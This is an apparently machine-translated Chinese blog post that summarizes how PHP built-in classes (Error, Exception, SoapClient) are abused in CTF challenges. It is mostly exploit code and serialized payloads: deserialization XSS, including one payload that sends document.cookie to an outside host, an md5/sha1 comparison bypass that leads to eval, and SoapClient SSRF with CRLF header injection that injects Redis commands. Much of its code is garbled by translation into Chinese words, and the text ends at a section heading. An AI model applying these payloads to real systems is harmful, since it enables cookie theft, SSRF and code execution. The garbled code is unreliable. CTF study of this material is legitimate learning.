##  PHP原生类的利用小结

原创 sample SK [ 刹客网络科技资讯 ](javascript:void\(0\);)

**刹客网络科技资讯** ![]()

微信号 Shake_network

功能介绍 最新科技资讯，以及学习资料、影视、软件、各种好玩的网站等资讯

____

__

收录于话题

![](https://gitee.com/fuli009/images/raw/master/public/20210826084224.png)

**刹客网络科技资讯**
点击右侧关注，最新科技资讯！![](https://gitee.com/fuli009/images/raw/master/public/20210826084239.png)

  

# 前言

在CTF题目中，好几次都遇到了利用PHP原生类进行XSS、反序列化、SSRF、XXE以及就读文件的思路，遇到一个卡住一个……一直想好找一下PHP原生类在CTF中的利用，迫不及待地生活xx了好久今天。终于有机会拖累总结总结了。使用以下方法遍历一下PHP的构建类：

  

PHP

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17   
    18   
    19   
    20   
    21   
    22  
    

|

    
    
       
    $classes = get_declared_classes();   
    foreach ( $classes  as  $class ) { $methods = get_class_methods( $class ); foreach ( $methods as $method ) { if (in_array( $method , array ( '__destruct' , '__toString' , '__wakeup' , '__call' , '__callStatic' , '__get' , '__set' , '__isset' , '__unset' , '  
          
            
              
                  
                  
                  
                  
                  
                  
                  
                  
                  
                  
                '__set_state'     // 可以根据题目的环境将指定的方法添加进来，来遍历存在的方法的原生类  
            ))) { print $class . '::'。$方法。"\n" ;         }     } }  
                   
      
      
      
      
  
---|---  
  
  

输出一下结果：

  

PHP

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17   
    18   
    19   
    20   
    21   
    22  
    

|

    
    
    异常:: __唤醒  
    异常:: __的toString   
    ErrorException :: __唤醒  
    ErrorException :: __的toString  
    错误:: __唤醒  
    错误:: __的toString   
    CompileError :: __唤醒  
    CompileError :: __的toString   
    ParseError :: __唤醒  
    ParseError :: __的toString  
    类型错误:: __唤醒  
    类型错误:: __的toString   
    ArgumentCountError： :__wakeup   
    ArgumentCountError ::__toString   
    ArithmeticError ::__wakeup   
    ArithmeticError ::__toString   
    DivisionByZeroError ::__wakeup  
    DivisionByZeroError ::__toString   
    ClosedGeneratorException::__wakeup   
    ClosedGeneratorException::__toString   
    DateTime::__wakeup   
    ......  
      
  
---|---  
  
  

经常遇到的几个PHP原生类有以下几个：

  * 错误

  * 异常

  * 肥皂客户端

  * 目录迭代器

  * 简单 XML 元素

下面我们根据这几个原生类的利用方式分别进行讲解。

# 使用Error/Exception 内置类进行XSS

## 错误√类

  * 适用于php7版本

  * 在开启提示的情况下

错误类是php的一个内置类，用于自动自定义一个错误，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个`__toString()`的方法，常用于PHP反序列化中。如果有POP链去不是就走不通了，不如尝试利用来做一个xs，其实我看到的还是有好`echo
几厘米会选择直接使用的写法，当PHP对象被当作一个字符串输出或使用的时候（如`echo`的）
）时候会触发`__toString`方法，这是一种挖洞的新思路。`

  

`下面演示如何使用 Error 内置类来构造 XSS。`

`测试代码：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4  
    

|

    
    
      
    $a = unserialize( $_GET [ 'whoami' ]);   
    回声 $a ;   
    ?>   
      
  
---|---  
  
`  
`

`（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，有遇到过一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化化）`

`赠送POC：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7  
    

|

    
    
      
    $a = new  Error ( "" );   
    $b = 序列化( $a );   
    echo urlencode( $b );    
    ?>  
      
    //输出：O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29% 3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi% 3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22% 3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D  
      
  
---|---  
  
`  
`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084240.png)`

`成功弹窗。`

## `异常√类`

  * `适用于php5、7版本`

  * `开启报错的情况下`

`测试代码：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4  
    

|

    
    
      
    $a = unserialize( $_GET [ 'whoami' ]);   
    回声 $a ;   
    ?>   
      
  
---|---  
  
`  
`

`赠送POC：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7  
    

|

    
    
      
    $a = new  Exception ( "" );   
    $b = 序列化( $a );   
    echo urlencode( $b );    
    ?>  
      
    //输出：O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29% 3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi% 3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22% 3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D  
      
  
---|---  
  
`  
`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084241.png)`

## `[BJDCTF 2nd]xss之光`

`进入题目，首先通过git泄露暴露：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3  
    

|

    
    
      
    $a = $_GET [ 'yds_is_so_beautiful' ];   
    echo 反序列化( $a );  
      
  
---|---  
  
`  
`

`没有看到一个反序列化函数并没有给出需要反序列化的类，还有一个反序列化但没有POP链的情况所以，只能找到PHP内置类来进行反序列化又有。一个echo，跑了，就是我们刚才没得演示的利用Error或Exception内置类进行XSS，查看一下题目的环境发现是PHP
5，所以我们要使用Exception类。`

`由于此题是xss，所以只要xss执行window.open()`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4  
    

|

    
    
      
    $poc = new  Exception ( " " );   
    echo urlencode(serialize( $poc ));   
    ?>  
      
  
---|---  
  
`  
`

`得到有效载荷如下：`

`  
`

``

`PHP`

``

    
    
    1  
    

|

    
    
    /?yds_is_so_beautiful=O% 3 A9% 3 A% 22例外% 22 % 3 A7% 3 A% 7 Bs% 3 A10% 3 A% 22 % 00 % 2 A% 00消息% 22 % 3 Bs% 3 A109 3 A% 22 % 3 Cscript% 3 Ewindow.open% 28 % 27 http% 3 A% 2 F% 2 Fde28dfb3-f224 -48d4-b579-f1ea61189930.node3.buuoj.cn% 2 F% 3 F% 27 % 2 Bdocument.cookie% 29 % 3 B% 3 C% 2 Fscript% 3 E% 22 % 3 Bs% 3 A17% 3 A% 22 % 00异常% 00字符串% 22 % 3 Bs% 3 A0% 3 A% 22 % 22 % 3 Bs% 3 A7% 3 A% 22% 00 % 2 A% 00代码% 22 % 3 Bi% 3 A0% 3 Bs% 3 A7% 3 A% 22 % 00 % 2 A% 00文件% 22 % 3 Bs% 3 A18% 3 A% 22 % 2 Fusercode% 2 Ffile.php% 22 % 3 Bs% 3 A7% 3 A% 22 % 00 % 2 A% 00线% 22 % 3 Bi% 3 A2% 3 Bs% 3 A16% 3 A% 22 % 00例外% 00迹线% 22 % 3 Ba% 3 A0% 3 A% 7 B% 7 Ds% 3 A19% 3 A% 22 % 00例外% 00前一个 % 22 % 3 BN% 3 B% 7 D  
      
  
---|---  
  
`  
`

`执行后，得到flag就在cookie中：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084242.png)`

# `使用错误/异常内置类绕过比较比较`

`在本书中，我们已经认识了错误和异常这两个 PHP 内置类，但对他们妙用的只是 XSS，还可以通过巧妙的构造绕过 md5() 和 sha1)
函数的比较。详细的说一下这个两个错误类了。`

## `错误类`

`错误是所有PHP内部错误类的基类，该类是在PHP 7.0.0中开始日期的。`

`类摘要：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17   
    18  
    

|

    
    
    错误 实现 Throwable { /* 属性 */ protected string $message ; 受保护的int $code ; 受保护的字符串$file ; 受保护的int $line ; /* 方法 */ public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null ) final public getMessage() : string final public  
    	  
    	    
    	    
    	    
    	    
    	  
    	     
    	   
    	 getPrevious()：Throwable final public getCode()：mixed final public getFile()：string final public getLine()：int final public getTrace()：array final public getTraceAsString()：string public __toString()：string final private __clone( ) :无效}  
    	   
    	   
    	   
    	   
    	   
    	  
    	   
      
      
  
---|---  
  
`  
`

`类属性：`

  * `留言：错误消息内容`

  * `代码：错误代码`

  * `文件：抛出错误的文件名`

  * `行：抛出错误在该文件中的行数`

`类方法：`

  * ``Error::__construct` — 初始化错误对象`

  * ``Error::getMessage` — 获取错误信息`

  * ``Error::getPrevious` — 返回先前的 Throwable`

  * ``Error::getCode` — 获取错误代码`

  * ``Error::getFile` — 获取错误发生时的文件`

  * ``Error::getLine` ——获取错误发生时的行号`

  * ``Error::getTrace` — 获取调用栈（stack trace）`

  * ``Error::getTraceAsString` — 获取字符串形式的调用栈（stack trace）`

  * ``Error::__toString` — error 的字符串表达`

  * ``Error::__clone` — 克隆错误`

## `异常类`

`例外是所有异常的基类，该类是在 PHP 5.0.0 中开始日期的。`

`类摘要：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17   
    18  
    

|

    
    
    异常{ /* 属性 */受保护的字符串$message ; 受保护的int $code ; 受保护的字符串$file ; 受保护的int $line ; /* 方法 */ public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null ) final public getMessage() : string final public getPrevious () : Throwable  
    	  
    	    
    	    
    	    
    	    
    	  
    	     
    	   
    	   
    	final  public getCode()：混合final public getFile()：string final public getLine()：int final public getTrace()：array final public getTraceAsString()：string public __toString()：string final private __clone()：void }  
    	   
    	   
    	   
    	   
    	  
    	   
      
      
  
---|---  
  
`  
`

`类属性：`

  * `message：异常消息内容`

  * `代码：异常代码`

  * `文件名：抛出异常的文件名`

  * `行：抛出异常在该文件中的行号`

`类方法：`

  * ``Exception::__construct` — 异常构造函数`

  * ``Exception::getMessage` — 获取异常消息内容`

  * ``Exception::getPrevious` — 返回异常链中的前一个异常`

  * ``Exception::getCode` — 获取异常代码`

  * ``Exception::getFile` ——创建异常时的程序文件名称`

  * ``Exception::getLine` ——获取创建的异常文件中的行号`

  * ``Exception::getTrace` — 获取异常追踪信息`

  * ``Exception::getTraceAsString` — 获取字符串类型的异常追踪信息`

  * ``Exception::__toString` — 将异常对象转换为字符串`

  * ``Exception::__clone` — 异常克隆`

`我们可以看到，在错误和异常方法这两个PHP原生类中，只有`__toString`这个方法用于异常或错误对象转换为字符串。`

`我们以错误为例，我们看看当触发他的`__toString`方法时会发生什么：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3  
    

|

    
    
      
    $a = new  Error ( "payload" , 1 );   
    回声 $a ;  
      
  
---|---  
  
`  
`

`输出如下：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3  
    

|

    
    
    错误：/usercode/file.php 中的有效负载：2  
    堆栈跟踪：  
    #0 {main}  
      
  
---|---  
  
`  
`

`发现这将会以字符串的形式输出当前错误，包含当前的错误（“payload”）以及当前的行号（“2”），而信息`Error("payload",1)`中的错误代码“1”则没有输出输出。`

`在来看看下一个例子：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5  
    

|

    
    
      
    $a = new  Error ( "payload" , 1 ); $b = new  Error ( "payload" , 2 );   
    回声 $a ;   
    echo  "\r\n\r\n" ;   
    回声 $b ;  
      
  
---|---  
  
`  
`

`输出如下：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7  
    

|

    
    
    错误：/usercode/file.php 中的有效负载：2  
    堆栈跟踪：  
    #0 {main}  
      
    错误：/usercode/file.php 中的有效负载：2  
    堆栈跟踪：  
    #0 {main}  
      
  
---|---  
  
`  
`

`可以看出，`$a`和`$b`这两个错误对象是不同的，但是`__toString`方法返回的结果是相同的。注意，`__toString`返回必须在同一行是因为的数据包含当前行号。`

`异常类与错误的使用和结果完全一样，仅`Exception`适用于 PHP 5 和 7，而仅`Error`适用于 PHP 7。`

`错误和异常类的这一点在绕过在PHP类中的一些比较时有用，具体请看下面这道例题。`

## `[2020极客大挑战]Greatphp`

`进入题目，提交源码：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17   
    18   
    19   
    20   
    21   
    22   
    23   
    24   
    25  
    

|

    
    
      
     error_reporting( 0 );   
    类 SYCLOVER  {公共$syc；公共$lover ;  
           
           
      
        公共 函数 __wakeup () { if ( ( $this ->syc != $this ->lover) && (md5( $this ->syc) === md5( $this ->lover)) && (sha1( $this ->syc) === sha1( $this ->lover)) ){ if (!preg_match( "/\<\?php|\(|\)|\"|\'/" , $this ->syc, $match ) ){ eval ( $this ->syc);            } else { die ( "Try Hard !!" );            }         }     } }  
              
                 
                     
      
                     
      
                 
      
      
      
      
    if ( isset ( $_GET [ 'great' ])){ 反  
        序列化( $_GET [ 'great' ]);   
    } else {   
        highlight_file( __FILE__ );   
    }  
      
    ?>  
      
  
---|---  
  
`  
`

`可见，需要进入eval()执行代码需要先通过上面的if语句：`

`  
`

``

`PHP`

``

    
    
    1  
    

|

    
    
    if ( ( $this ->syc != $this ->lover) && (md5( $this ->syc) === md5( $this ->lover)) && (sha1( $this ->syc)== = sha1( $this ->lover)) )  
      
  
---|---  
  
`  
`

`这个乍看第一眼在ctf的基础题目中非常常见，一般情况下只需要使用一连串的一类里面。但是这里是在，我们当然不能这样做。`

`这里的考点是md5()和sha1()可以对同一个类进行hash，会触发这个类的`__toString`方法并且当eval()函数能够实现一个类对象的时候，也会出现这个类里的`__toString`方法。`

`所以我们可以使用含有使用`__toString`方法的PHP内置两个类来实现，用的比较多的内置类就是`Exception`和`Error`他们，其中有一个`__toString`方法，当类被当做字符串处理时，就会调用这个函数。`

`刚讲完的Error类和Exception类中 `__toString`的特性，我们可以用这两个内置的方法进行绕过。`

`由于题目用了小外引调用函数，我们`include "/flag"`过滤水试直接将被举报引入。由于过滤了标签，我们直接用url取反识别无法识别。`

`POC如下：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17   
    18   
    19   
    20   
    21   
    22   
    23   
    24   
    25   
    26   
    27   
    28   
    29   
    30   
    31  
    

|

    
    
      
      
    类 SYCLOVER  {公共$syc；公共$lover ; 公共函数__wakeup (  
    	   
    	   
    	  ) { if ( ( $this ->syc != $this ->lover) && (md5( $this ->syc) === md5( $this ->lover)) && (sha1( $this ->syc) === sha1( $this ->lover)) ){ if (!preg_match( "/\<\?php|\(|\)|\"|\'/" , $this ->syc, $match ) ){ eval ( $this ->syc); 		   } else { die ( "Try Hard !!" ); 		   } 		} 	} }  
    		  
    		     
    			     
      
    			     
      
    		     
      
      
      
      
    $str = "?> .urldecode( "%D0%99%93%9E%98" )。"?>" ;   
    /*  
    或使用[~(取反)][!%FF]的形式，  
    即： $str = "?>";      
      
    $str = "?>";   
    */   
    $a =新 错误( $str , 1 ); $b =新 错误( $str , 2 );   
    $c =新SYCLOVER();   
    $c ->syc = $a ;   
    $c -> 情人 = $b ;   
    回声（urlencode（序列化（$c）））；  
      
    ?>  
      
  
---|---  
  
`  
`

`这里`$str =
"?>";`为什么要在前面加上一个`?>`呢？因为`Exception`类与`Error`的`__toString`方法在eval()函数中输出的结果是不可能控制的，即输出的报错信息中，payload前面还有一段杂乱信息“Error:
”：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3  
    

|

    
    
    错误：/usercode/file.php 中的有效负载：2  
    堆栈跟踪：  
    #0 {main}  
      
  
---|---  
  
`  
`

`进入的eval（）函数会类似于：`eval("...Error: ")`。我们所以要用`?>`来闭合一下，即`eval("...Error:
?>")`，这样我们的有效载荷便能顺利执行了。`

`生成的payload如下：`

`  
`

``

`PHP`

``

    
    
    1  
    

|

    
    
    O% 3 A8% 3 A% 22 SYCLOVER% 22 % 3 A2% 3 A% 7 Bs% 3 A3% 3 A% 22 syc% 22 % 3 BO% 3 A5% 3 A% 22错误% 22 % 3 A7% 3 A% 7 Bs% 3 A10% 3 A% 22 % 00 % 2 A% 00消息% 22 % 3 Bs% 3A20% 3 A% 22 % 3 F% 3 E% 3 C% 3 F% 3 Dinclude% 7 E%D0% 99 % 93 % 9 E% 98 % 3 F% 3 E% 22 % 3 Bs% 3 A13% 3 A% 22 % 00错误% 00字符串% 22 % 3 Bs% 3 A0% 3 A% 22 % 22 %3 Bs% 3 A7% 3 A% 22 % 00 % 2 A% 00代码% 22 % 3 Bi% 3 A1% 3 Bs% 3 A7% 3 A% 22 % 00 % 2 A% 00文件% 22 % 3 Bs % 3 A18% 3 A% 22 % 2 Fusercode% 2 Ffile.php% 22 % 3 Bs% 3 A7% 3 A%22 % 00 % 2 A% 00线% 22 % 3 Bi% 3 A19% 3 Bs% 3 A12% 3 A% 22 % 00误差% 00迹线% 22 % 3 Ba% 3 A0% 3 A% 7 B% 7 Ds% 3 A15% 3 A% 22 % 00错误% 00先前% 22 % 3 BN% 3 B%7 Ds% 3 A5% 3 A% 22情人% 22 % 3 BO% 3 A5% 3 A% 22错误% 22 % 3 A7% 3 A% 7 Bs% 3 A10% 3 A% 22 % 00 % 2 A% 00消息% 22 % 3 Bs% 3 A20% 3 A% 22 % 3 F% 3 E% 3 C% 3 F%3 Dinclude% 7 E%D0% 99 % 93 % 9 E% 98 % 3 F% 3 E% 22 % 3 Bs% 3 A13% 3 A% 22 % 00错误% 00字符串% 22 % 3 Bs% 3 A0% 3 A% 22 % 22 % 3 Bs% 3 A7% 3 A% 22 % 00 % 2 A% 00代码% 22 % 3 Bi% 3 A2% 3 Bs% 3 A7% 3 A% 22 % 00 % 2 A% 00文件% 22 % 3 Bs% 3 A18% 3 A% 22 % 2 Fusercode% 2 Ffile.php% 22 % 3 Bs% 3 A7% 3 A% 22 % 00 % 2 A% 00线% 22 % 3 Bi% 3A19% 3 Bs% 3 A12% 3 A% 22 % 00错误% 00跟踪% 22 % 3 Ba% 3 A0% 3 A% 7 B% 7 Ds% 3 A15% 3 A% 22 % 00错误% 00以前% 22 % 3 BN% 3 B% 7 D% 7 D  
      
  
---|---  
  
`  
`

`执行表达标志：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084243.png)`

# `使用 SoapClient 类进行 SSRF`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084244.png)`

## `SoapClient 类`

`PHP 的内置类 SoapClient 是一个专门用于访问 Web 服务的类，可以提供一个基于 SOAP 协议访问 Web 服务的 PHP 客户端。`

`类摘要如下：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17  
    

|

    
    
    SoapClient { /* 方法 */ public __construct ( string | null $wsdl , array $options = [] ) public __call ( string $name , array $args ) : mixed public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string | 空公共__getCookies () ：  
    	  
    	    
    	    
    	       
    	数组公共__getFunctions()：数组| null public __getLastRequest () : string | null public __getLastRequestHeaders ():字符串| null public __getLastResponse () :字符串| null public __getLastResponseHeaders () : string | null public __getTypes () :数组| null public __setCookie ( string $name , string | null $value =  
    	  
    	  
    	  
    	  
    	  
    	  
    	  null ) : void public __setLocation ( string $location = "" ) : string | null public __setSoapHeaders ( SoapHeader| array | null $headers = null ) : bool public __soapCall ( string $name , array $args , array | null $options = null , SoapHeader| array | null $inputHeaders = null ,  
    	   
    	   
    	    数组& $outputHeaders = null ) : 混合  
    }  
      
  
---|---  
  
`  
`

`可以看到，该内置类有一个`__call`方法，当`__call`方法被触发后，它可以发送 HTTP 和 HTTPS
请求。正是这个`__call`方法，模仿 SoapClient 类被我们应用在 SSRF 中。SoapClient
这个类也可以推理出来被出来了最好用的一个内置类。`

`该类的构造函数如下：`

`  
`

``

`PHP`

``

    
    
    1  
    

|

    
    
    public SoapClient :: SoapClient(混合$wsdl [，数组 $options ])  
      
  
---|---  
  
`  
`

  * `第一个参数是禁止是否是 wsdl 模式，如果值设为 null 则表示非 wsdl 模式。`

  * `第二个参数为一个数组，如果在wsdl模式下，此参数选择；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要请求发送到SOAP服务器的URL，而uri是SOAP服务的特有空间。`

## `使用 SoapClient 类进行 SSRF`

`知道前面两个参数的含义后，就容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的位置选项设置为target_url。`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7  
    

|

    
    
      
    $a = new SoapClient( null , array ( 'location' => 'http://47.xxx.xxx.72:2333/aaa' , 'uri' => 'http://47.xxx. xxx.72:2333' ));   
    $b = 序列化( $a );   
    回声 $b ;   
    $c = 反序列化( $b );   
    $c -> a();    // 随便调用对象中不存在的方法,触发__call方法进行ssrf   
    ?>  
      
  
---|---  
  
`  
`

`首先在47.xxx.xxx.72上面起个监听：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084245.png)`

`然后执行上述代码，如下图所示成功触发SSRF，47.xxx.xxx.72上面收到了请求信息：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084246.png)`

`但是，由于它采用 HTTP/HTTPS 协议，所以用处不是很好。而如果这里 HTTP 隐匿还存在 CRLF 漏洞，但我们则可以通过
SSRF+CRLF，插入任意的 HTTP 头。`

`如下测试代码，我们在HTTP头中插入一个cookie：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8  
    

|

    
    
      
    $target = 'http://47.xxx.xxx.72:2333/' ;   
    $a = new SoapClient( null , array ( 'location' => $target , 'user_agent' => "WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4" , 'uri' => 'test' ));   
    $b = 序列化( $a );   
    回声 $b ;   
    $c = 反序列化( $b );   
    $c -> a();    // 随便调用对象中不存在的方法,触发__call方法进行ssrf   
    ?>  
      
  
---|---  
  
`  
`

`执行代码后，如下图所示，成功在HTTP头中插入了一个我们自定义的cookie：`

`![]()`

`可以再去drops回顾一下如何通过HTTP协议去攻击Redis的：Trying to hack Redis via HTTP requests`

`如下测试代码：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10  
    

|

    
    
      
    $target = 'http://47.xxx.xxx.72:6379/' ;   
    $poc = "CONFIG SET 目录 /var/www/html" ;   
    $a = new SoapClient( null , array ( 'location' => $target , 'uri' => 'hello^^' . $poc . '^^hello' ));   
    $b = 序列化( $a );   
    $b = str_replace( '^^' , "\n\r" , $b );   
    回声 $b ;  
    $b );   
    $c -> a();    // 随便调用对象中不存在的方法,触发__call方法进行ssrf   
    ?>  
      
  
---|---  
  
`  
`

`执行代码后，如下图所示，成功插入了Redis命令：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084247.png)`

`这样我们就可以利用HTTP协议去攻击Redis了。`

`对于如何发送POST的数据包，这里面还有一个坑，就是`Content-Type`的设置，因为我们要提交的是POST数据，所以`Content-
Type`的值我们要设置为`application/x-www-form-urlencoded`，如何这里修改`Content-
Type`的值呢？由于`Content-Type`在`User-Agent`的下面，所以我们可以通过`SoapClient`来设置`User-
Agent`，将原来的`Content-Type`挤压下去，从而再插入一个新的`Content-Type`。`

`测试代码如下：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14  
    

|

    
    
      
    $target = 'http://47.xxx.xxx.72:2333/' ;   
    $post_data = 'data=whoami' ;   
    $headers = array ( 'X-Forwarded-For: 127.0.0.1' , 'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93' ); $a = new SoapClient( null , array ( 'location' => $target , 'user_agent' => 'wupco^^Content-Type: application/x-www-form-urlencoded^^' .join( '^^' , $headers ). '^^Content-Length: ' . (字符串  
          
          
      
    )strlen( $post_data )。'^^^^'。$post_data , 'uri' => 'test' ));   
    $b = 序列化( $a );   
    $b = str_replace( '^^' , "\n\r" , $b );   
    回声 $b ;   
    $c = 反序列化( $b );   
    $c -> a();    // 随便调用对象中不存在的方法,触发__call方法进行ssrf   
    ?>  
      
  
---|---  
  
`  
`

`执行代码后，如下图所示，成功发送POST数据：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084248.png)`

## `bestphp 的报复`

`bestphp的报复这道题利用的就是这个点，即对SoapClient类进行反序列化触发SSRF，并配合CRLF构造payload。`

`进入题目，提交源码：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084249.png)`

`扫描目录发现flag.php：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084250.png)`

`很明显当127.0.0.1时在会话中插入flag，就会得到flag。很明显要利用ssrf。`

`但是这里并没有明显的ssrf利用，所以我们认为PHP点类SoapClient触发反序列化导致SSRF，因为flag会被插入到会话中，所以我们就一定需要携带一个cookie即PHPSESSID去访问它来生成这个会话文件。`

`写出最后的POC：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7  
    

|

    
    
      
    $target = "http://127.0.0.1/flag.php" ;   
    $attack = new SoapClient( null , array ( 'location' => $target , 'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n" , 'uri' => "123" )); $payload = urlencode(serialize( $attack )); 回声$payload ;  
          
          
      
       
      
  
---|---  
  
`  
`

`生成有效载荷：`

`  
`

``

`PHP`

``

    
    
    1  
    

|

    
    
    O% 3 A10% 3 A% 22 SoapClient% 22 % 3 A4% 3 A% 7 Bs% 3 A3% 3 A% 22 uri% 22 % 3 Bs% 3 A3% 3 A% 22123 % 22 % 3 Bs% 3 A8% 3 A% 22位置% 22 % 3 Bs% 3 A25% 3 A% 22 http% 3 A% 2 F% 2F127 .0 .0 .1 % 2 Fflag.php% 22 % 3 Bs% 3 A11% 3 A% 22 _user_agent% 22 % 3 Bs% 3 A56% 3 A% 22 N0rth3ty% 0 D% 0 ACookie% 3 A+ PHPSESSID% 3 Dtcjr6nadpk3md7jbgioa6elfk4% 0 D% 0 A% 22 % 3 Bs% 3 A13% 3 A% 22 _soap_version% 22 % 3双% 3 A1% 3 B% 7 D  
      
  
---|---  
  
`  
`

`这里POC就是利用CRLF晚上这个本地请求SSRF去访问flag.php，将得到的flag结果保存在cookie为`PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4`会话中。`

`然后，我们就想办法解决反序列化对象，但这里有没有反序列化点，那我们怎么办呢？漏洞。但是如果利用会话反序列化漏洞的话，我们必须要`ini_set()`这个函数来改变`session.serialize_handler`的值，将会话反序列化引擎修改为其他的，本来应该使用ini_set()这个函数的，但是函数函数不数组接受，所以就不能了。于是我们就用session_start()函数来代替，即构造`session_start(serialize_handler=php_serialize)`就行了。我们利用题目中的`call_user_func($_GET['f'],
$_POST);`函数，函数可以GET：/?f=session_start、POST：serialize_handler=php_serialize，实现`session_start(serialize_handler=php_serialize)`的调用来修改此页面的序列化引擎为php_serialize。`

`所以，我们第一次传值先注入了POC生成的有效载荷并得到我们的会话：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084251.png)`

`此时，将 php 原生类 SoapClient
构造的payload我们成功了`PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4`的会话中，当页面加载时会自动将其反序列化。但此时我们还不会触发
SSRF，需要触发`__call`方法来导致SSRF，方法在对象中一个存在的方法，方法在对象中时会被自动调用，方法可能会反序列化还没有对象，方法需要访问该中一个存在的方法，这里就没有下面这些代码：`

`  
`

``

`PHP`

``

    
    
    1   
    2  
    

|

    
    
    $a = array (reset( $_SESSION ), 'welcome_to_the_lctf2018' );   
    call_user_func( $b , $a );  
      
  
---|---  
  
`  
`

`我们可以利用extract函数将变量覆盖为call_user_func，这样，就成了：`

`  
`

``

`PHP`

``

    
    
    1  
    

|

    
    
    call_user_func(call_user_func, array (reset( $_SESSION ), 'welcome_to_the_lctf2018' ));  
      
  
---|---  
  
`  
`

`call_user_func()函数有一个特性，就是当只粒子一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()这个数组中的第一个值做当类名，第二个值当做方法名。`

`这样也就是会访问我们构造的session对象中的welcome_to_the_lctf2018方法而，welcome_to_the_lctf2018方法不存在，会触发`__call`方法，导致ssrf去访问flag.php。`

`所以我们第二次传参如下：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084252.png)`

`最后，我们第三次传参，用我们POC里面自己设置的饼干（`PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4`）去访问这个页面，`var_dump($_SESSION);`会将`PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4`的这个会话内容输出出来，即可得到标志：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084253.png)`

# `使用 SimpleXMLElement 类进行 XXE`

